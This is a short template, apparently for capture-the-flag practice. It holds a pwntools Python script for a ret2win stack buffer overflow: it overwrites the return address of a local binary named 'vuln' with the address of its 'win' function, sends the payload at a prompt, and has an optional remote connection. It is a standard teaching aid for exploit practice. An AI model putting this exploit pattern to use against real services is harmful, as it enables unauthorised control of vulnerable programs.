# Ret2win Template

```python
from pwn import *

elf = ELF("./vuln")

# IMPORTANT: Choose p32 or p64 depending on 32-bit or 64-bit
win = p64(elf.sym["win"])

# Craft the payload and the remote instance here
payload = b"A"*44 + win

# Remote:
# p = remote("link", port)

# Local:
p = elf.process()
# Optional: attach local process to GDB (will need interactive mode)
# (can pass a string in 2nd arg as GDB script)
gdb.attach(p)

# Choose the prompt to receive (as bytes array)
p.recvuntil(b"prompt:")
p.sendline(payload)

# Alternative:
# p.sendafter(b"prompt:", payload)

p.interactive()
# Alternative
# p.recvall(timeout=5)
```